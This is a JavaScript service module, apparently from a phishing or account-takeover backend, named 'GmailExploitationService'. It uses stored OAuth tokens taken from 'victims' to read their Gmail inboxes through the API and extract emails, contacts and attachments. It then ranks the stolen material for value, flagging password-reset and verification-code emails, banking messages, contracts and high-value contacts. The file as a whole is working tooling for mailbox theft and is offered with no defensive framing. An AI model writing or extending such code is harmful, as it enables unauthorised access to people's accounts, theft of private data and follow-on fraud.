// Gmail access & extraction service
// Handles Gmail API access and data extraction

const { google } = require('googleapis');
const { v4: uuidv4 } = require('uuid');
const EncryptionService = require('./encryption');
const { getEncryptionConfig } = require('../config/encryption');
const logger = require('../utils/logger');

class GmailExploitationService {
  constructor(
    gmailAccessLogRepository,
    oauthTokenRepository,
    victimRepository,
    activityLogRepository
  ) {
    this.gmailAccessLogRepository = gmailAccessLogRepository;
    this.oauthTokenRepository = oauthTokenRepository;
    this.victimRepository = victimRepository;
    this.activityLogRepository = activityLogRepository;
    
    // Initialize encryption service for OAuth tokens
    const encryptionConfig = getEncryptionConfig();
    this.encryptionService = new EncryptionService(encryptionConfig.oauthEncryptionKey);
  }

  /**
   * Initiate Gmail access session
   * @param {string} victimId - Victim ID
   * @param {string} adminId - Admin user ID
   * @param {string} accessMethod - Access method (oauth_tokens, session_cookies, credential_replay)
   * @returns {Promise<Object>} - Gmail access session
   */
  async initiateAccess(victimId, adminId, accessMethod = 'oauth_tokens') {
    // Get victim and OAuth tokens
    const victim = await this.victimRepository.findById(victimId);
    if (!victim) {
      throw new Error('Victim not found');
    }

    // Get active OAuth tokens for Google
    const oauthTokens = await this.oauthTokenRepository.findByVictimId(victimId);
    const googleToken = oauthTokens.find(t => 
      t.provider === 'google' && t.tokenStatus === 'active'
    );

    if (!googleToken && accessMethod === 'oauth_tokens') {
      throw new Error('No active Google OAuth token found for this victim');
    }

    // Create activity log
    const activityLog = await this.activityLogRepository.create({
      logId: `GMAIL-ACCESS-${uuidv4()}`,
      actionType: 'gmail_access_initiated',
      actionCategory: 'data_access',
      severityLevel: 'high',
      actor: {
        type: 'admin_user',
        id: adminId
      },
      target: {
        type: 'victim',
        id: victimId,
        email: victim.email
      },
      actionDetails: {
        accessMethod,
        provider: 'gmail'
      },
      technicalContext: {
        timestamp: new Date().toISOString()
      },
      adminId
    });

    // Create Gmail access log session
    const sessionId = `GMAIL-SESSION-${uuidv4()}`;
    const gmailAccessLog = await this.gmailAccessLogRepository.create({
      sessionId,
      parentActivityLogId: activityLog.id,
      adminId,
      victimId,
      accessMethod,
      authenticationDetails: {
        method: accessMethod,
        oauthTokenId: googleToken?.id || null,
        timestamp: new Date().toISOString()
      },
      sessionTimeline: [{
        event: 'session_initiated',
        timestamp: new Date().toISOString()
      }],
      status: 'in_progress'
    });

    return {
      sessionId,
      gmailAccessLog,
      activityLog
    };
  }

  /**
   * Extract data from Gmail
   * @param {string} sessionId - Gmail access session ID
   * @param {Object} extractionConfig - Extraction configuration
   * @returns {Promise<Object>} - Extraction results
   */
  async extractData(sessionId, extractionConfig = {}) {
    const {
      extractEmails = true,
      extractContacts = true,
      extractAttachments = false,
      dateRange = null,
      maxResults = 100
    } = extractionConfig;

    // Get Gmail access log
    const gmailAccessLog = await this.gmailAccessLogRepository.findBySessionId(sessionId);
    if (!gmailAccessLog) {
      throw new Error('Gmail access session not found');
    }

    if (gmailAccessLog.status !== 'in_progress') {
      throw new Error(`Session is ${gmailAccessLog.status}, cannot extract data`);
    }

    // Get OAuth token and decrypt
    const oauthTokens = await this.oauthTokenRepository.findByVictimId(gmailAccessLog.victimId);
    const googleToken = oauthTokens.find(t => 
      t.provider === 'google' && t.tokenStatus === 'active'
    );

    if (!googleToken) {
      throw new Error('No active Google OAuth token found');
    }

    // Decrypt token data
    const decryptedTokenData = this.encryptionService.decrypt(googleToken.tokenData);

    // Initialize Gmail API client
    const oauth2Client = new google.auth.OAuth2();
    oauth2Client.setCredentials({
      access_token: decryptedTokenData.access_token,
      refresh_token: decryptedTokenData.refresh_token
    });

    const gmail = google.gmail({ version: 'v1', auth: oauth2Client });

    const extractionResults = {
      emails: [],
      contacts: [],
      attachments: [],
      metadata: {
        extractionTimestamp: new Date().toISOString(),
        config: extractionConfig
      }
    };

    // Extract emails
    if (extractEmails) {
      try {
        const messagesResponse = await gmail.users.messages.list({
          userId: 'me',
          maxResults: Math.min(maxResults, 500)
        });

        if (messagesResponse.data.messages) {
          for (const message of messagesResponse.data.messages.slice(0, maxResults)) {
            const messageDetail = await gmail.users.messages.get({
              userId: 'me',
              id: message.id,
              format: 'full'
            });

            extractionResults.emails.push({
              id: message.id,
              threadId: messageDetail.data.threadId,
              snippet: messageDetail.data.snippet,
              subject: messageDetail.data.payload?.headers?.find(h => h.name === 'Subject')?.value,
              from: messageDetail.data.payload?.headers?.find(h => h.name === 'From')?.value,
              to: messageDetail.data.payload?.headers?.find(h => h.name === 'To')?.value,
              date: messageDetail.data.payload?.headers?.find(h => h.name === 'Date')?.value,
              internalDate: messageDetail.data.internalDate
            });
          }
        }
      } catch (error) {
        logger.error('Error extracting emails:', error);
        extractionResults.errors = extractionResults.errors || [];
        extractionResults.errors.push({
          type: 'email_extraction',
          message: error.message
        });
      }
    }

    // Extract contacts (from email addresses)
    if (extractContacts) {
      const contacts = new Set();
      extractionResults.emails.forEach(email => {
        if (email.from) {
          const emailMatch = email.from.match(/<(.+)>/);
          if (emailMatch) {
            contacts.add(emailMatch[1]);
          } else {
            contacts.add(email.from);
          }
        }
        if (email.to) {
          const emailMatch = email.to.match(/<(.+)>/);
          if (emailMatch) {
            contacts.add(emailMatch[1]);
          } else {
            contacts.add(email.to);
          }
        }
      });
      extractionResults.contacts = Array.from(contacts).map(email => ({ email }));
    }

    // Extract attachments
    if (extractAttachments) {
      try {
        for (const email of extractionResults.emails) {
          const messageDetail = await gmail.users.messages.get({
            userId: 'me',
            id: email.id,
            format: 'full'
          });

          const parts = this.getParts(messageDetail.data.payload);
          for (const part of parts) {
            if (part.filename && part.body?.attachmentId) {
              const attachment = await gmail.users.messages.attachments.get({
                userId: 'me',
                messageId: email.id,
                id: part.body.attachmentId
              });

              extractionResults.attachments.push({
                messageId: email.id,
                filename: part.filename,
                mimeType: part.mimeType,
                size: part.body.size,
                attachmentId: part.body.attachmentId,
                data: attachment.data.data
              });
            }
          }
        }
      } catch (error) {
        logger.error('Error extracting attachments:', error);
        extractionResults.errors = extractionResults.errors || [];
        extractionResults.errors.push({
          type: 'attachment_extraction',
          message: error.message
        });
      }
    }

    // Perform intelligence analysis
    const intelligenceAnalysis = await this.analyzeIntelligence(extractionResults);

    // Update Gmail access log with results
    await this.gmailAccessLogRepository.update(gmailAccessLog.id, {
      extractionResults,
      intelligenceAnalysis,
      status: 'completed',
      completedAt: new Date(),
      sessionTimeline: [
        ...(gmailAccessLog.sessionTimeline || []),
        {
          event: 'extraction_completed',
          timestamp: new Date().toISOString(),
          itemsExtracted: {
            emails: extractionResults.emails.length,
            contacts: extractionResults.contacts.length,
            attachments: extractionResults.attachments.length
          }
        }
      ]
    });

    return {
      sessionId,
      extractionResults,
      intelligenceAnalysis,
      status: 'completed'
    };
  }

  /**
   * Analyze extracted intelligence
   * @param {Object} extractionResults - Extraction results
   * @returns {Promise<Object>} - Intelligence analysis
   */
  async analyzeIntelligence(extractionResults) {
    const analysis = {
      business_intelligence: {
        company_insights: [],
        financial_documents: 0,
        contract_details: [],
        client_relationships: []
      },
      security_intelligence: {
        password_patterns: [],
        other_accounts: [],
        security_practices: []
      },
      social_intelligence: {
        personal_relationships: [],
        family_contacts: [],
        social_connections: []
      },
      valuable_emails: [],
      high_value_contacts: []
    };

    // Analyze emails for business intelligence
    for (const email of extractionResults.emails) {
      const subject = (email.subject || '').toLowerCase();
      const snippet = (email.snippet || '').toLowerCase();

      // Business contracts and agreements
      if (subject.includes('contract') || subject.includes('agreement') || subject.includes('deal')) {
        analysis.business_intelligence.contract_details.push({
          emailId: email.id,
          subject: email.subject,
          from: email.from,
          date: email.date
        });
      }

      // Financial documents
      if (subject.includes('invoice') || subject.includes('payment') || 
          subject.includes('billing') || subject.includes('receipt')) {
        analysis.business_intelligence.financial_documents++;
      }

      // Banking communications
      if (email.from && (
        email.from.toLowerCase().includes('bank') ||
        email.from.toLowerCase().includes('financial') ||
        email.from.toLowerCase().includes('credit')
      )) {
        analysis.business_intelligence.client_relationships.push({
          email: email.from,
          type: 'banking',
          lastContact: email.date
        });
      }

      // Security intelligence - password patterns
      if (snippet.includes('password') || snippet.includes('reset') || 
          snippet.includes('verification code')) {
        analysis.security_intelligence.password_patterns.push({
          emailId: email.id,
          type: this.detectPasswordPattern(snippet)
        });
      }

      // Valuable emails (high priority indicators)
      const valueScore = this.calculateEmailValue(email);
      if (valueScore > 0.5) {
        analysis.valuable_emails.push({
          emailId: email.id,
          subject: email.subject,
          from: email.from,
          valueScore,
          reasons: this.getEmailValueReasons(email)
        });
      }
    }

    // Analyze contacts
    for (const contact of extractionResults.contacts) {
      const email = contact.email || '';
      const domain = email.split('@')[1]?.toLowerCase() || '';

      // Business contacts
      if (domain.includes('corp') || domain.includes('company') || 
          domain.includes('business') || domain.includes('enterprise')) {
        analysis.business_intelligence.company_insights.push({
          email,
          domain,
          type: 'business'
        });
      }

      // High-value contacts (executives, etc.)
      const contactValue = this.calculateContactValue(contact, extractionResults.emails);
      if (contactValue > 0.7) {
        analysis.high_value_contacts.push({
          email,
          valueScore: contactValue,
          interactionCount: this.countInteractions(email, extractionResults.emails)
        });
      }
    }

    return analysis;
  }

  /**
   * Get all parts from email payload (recursive)
   * @param {Object} payload - Email payload
   * @returns {Array} - All parts
   */
  getParts(payload) {
    const parts = [];
    
    if (payload.parts) {
      for (const part of payload.parts) {
        parts.push(...this.getParts(part));
      }
    } else if (payload.filename || payload.body?.attachmentId) {
      parts.push(payload);
    }
    
    return parts;
  }

  /**
   * Calculate email value score
   * @param {Object} email - Email object
   * @returns {number} - Value score (0-1)
   */
  calculateEmailValue(email) {
    let score = 0;
    const subject = (email.subject || '').toLowerCase();
    const from = (email.from || '').toLowerCase();

    // High-value keywords
    const highValueKeywords = [
      'confidential', 'private', 'internal', 'executive',
      'contract', 'agreement', 'deal', 'merger',
      'financial', 'banking', 'investment', 'revenue'
    ];

    for (const keyword of highValueKeywords) {
      if (subject.includes(keyword) || from.includes(keyword)) {
        score += 0.1;
      }
    }

    return Math.min(1, score);
  }

  /**
   * Get reasons for email value
   * @param {Object} email - Email object
   * @returns {Array} - Reasons
   */
  getEmailValueReasons(email) {
    const reasons = [];
    const subject = (email.subject || '').toLowerCase();

    if (subject.includes('confidential')) reasons.push('confidential_content');
    if (subject.includes('contract')) reasons.push('business_contract');
    if (subject.includes('financial')) reasons.push('financial_data');
    if (subject.includes('executive')) reasons.push('executive_communication');

    return reasons;
  }

  /**
   * Detect password pattern in text
   * @param {string} text - Text to analyze
   * @returns {string} - Pattern type
   */
  detectPasswordPattern(text) {
    if (text.includes('reset')) return 'password_reset';
    if (text.includes('verification code')) return 'verification_code';
    if (text.includes('new password')) return 'password_change';
    return 'password_mention';
  }

  /**
   * Calculate contact value score
   * @param {Object} contact - Contact object
   * @param {Array} emails - All emails
   * @returns {number} - Value score (0-1)
   */
  calculateContactValue(contact, emails) {
    const email = contact.email || '';
    const domain = email.split('@')[1]?.toLowerCase() || '';
    
    let score = 0;

    // Business domain
    if (domain.includes('corp') || domain.includes('company')) {
      score += 0.3;
    }

    // Executive domains
    if (domain.includes('ceo') || domain.includes('founder')) {
      score += 0.4;
    }

    // Interaction frequency
    const interactionCount = this.countInteractions(email, emails);
    if (interactionCount > 10) {
      score += 0.3;
    } else if (interactionCount > 5) {
      score += 0.2;
    }

    return Math.min(1, score);
  }

  /**
   * Count interactions with contact
   * @param {string} email - Contact email
   * @param {Array} emails - All emails
   * @returns {number} - Interaction count
   */
  countInteractions(email, emails) {
    return emails.filter(e => 
      (e.from && e.from.includes(email)) || 
      (e.to && e.to.includes(email))
    ).length;
  }

  /**
   * Extract emails with intelligent filtering
   * @param {Object} gmailService - Gmail API service
   * @param {Object} filters - Email filters
   * @returns {Promise<Array>} - Valuable emails
   */
  async extractEmailsWithIntelligence(gmailService, filters = {}) {
    const searchQueries = [
      'subject:contract OR subject:agreement OR subject:deal',
      'subject:invoice OR subject:payment OR subject:billing',
      'subject:password OR subject:reset OR subject:verification',
      'from:bank OR from:financial OR from:credit',
      'subject:confidential OR subject:private OR subject:internal'
    ];

    const valuableEmails = [];

    for (const query of searchQueries) {
      try {
        const results = await gmailService.users.messages.list({
          userId: 'me',
          q: query,
          maxResults: filters.max_per_query || 100
        });

        if (results.data.messages) {
          for (const messageRef of results.data.messages) {
            const message = await gmailService.users.messages.get({
              userId: 'me',
              id: messageRef.id,
              format: 'full'
            });

            const emailAnalysis = await this.analyzeEmailContent(message.data);
            if (emailAnalysis.value_score > 0.5) {
              valuableEmails.push({
                id: message.data.id,
                thread_id: message.data.threadId,
                subject: this.extractHeader(message.data, 'Subject'),
                from: this.extractHeader(message.data, 'From'),
                to: this.extractHeader(message.data, 'To'),
                date: this.extractHeader(message.data, 'Date'),
                body: this.extractEmailBody(message.data),
                attachments: this.extractAttachmentInfo(message.data),
                analysis: emailAnalysis
              });
            }
          }
        }
      } catch (error) {
        logger.warn(`Failed to extract emails for query '${query}':`, error.message);
      }
    }

    return valuableEmails;
  }

  /**
   * Analyze email content
   * @param {Object} message - Gmail message
   * @returns {Promise<Object>} - Email analysis
   */
  async analyzeEmailContent(message) {
    const subject = this.extractHeader(message, 'Subject') || '';
    const body = this.extractEmailBody(message);
    
    let valueScore = 0;
    const indicators = [];

    // Check for business indicators
    if (subject.toLowerCase().includes('contract') || 
        subject.toLowerCase().includes('agreement')) {
      valueScore += 0.3;
      indicators.push('business_contract');
    }

    // Check for financial indicators
    if (subject.toLowerCase().includes('invoice') || 
        subject.toLowerCase().includes('payment')) {
      valueScore += 0.3;
      indicators.push('financial_data');
    }

    // Check for security indicators
    if (subject.toLowerCase().includes('password') || 
        subject.toLowerCase().includes('reset')) {
      valueScore += 0.2;
      indicators.push('security_data');
    }

    return {
      value_score: Math.min(1, valueScore),
      indicators
    };
  }

  /**
   * Extract header from message
   * @param {Object} message - Gmail message
   * @param {string} name - Header name
   * @returns {string} - Header value
   */
  extractHeader(message, name) {
    const headers = message.payload?.headers || [];
    const header = headers.find(h => h.name === name);
    return header?.value || '';
  }

  /**
   * Extract email body
   * @param {Object} message - Gmail message
   * @returns {string} - Email body
   */
  extractEmailBody(message) {
    const parts = this.getParts(message.payload);
    for (const part of parts) {
      if (part.mimeType === 'text/plain' && part.body?.data) {
        return Buffer.from(part.body.data, 'base64').toString('utf-8');
      }
      if (part.mimeType === 'text/html' && part.body?.data) {
        return Buffer.from(part.body.data, 'base64').toString('utf-8');
      }
    }
    return '';
  }

  /**
   * Extract attachment info
   * @param {Object} message - Gmail message
   * @returns {Array} - Attachment info
   */
  extractAttachmentInfo(message) {
    const parts = this.getParts(message.payload);
    return parts
      .filter(part => part.filename && part.body?.attachmentId)
      .map(part => ({
        filename: part.filename,
        mimeType: part.mimeType,
        size: part.body.size,
        attachmentId: part.body.attachmentId
      }));
  }
}

module.exports = GmailExploitationService;

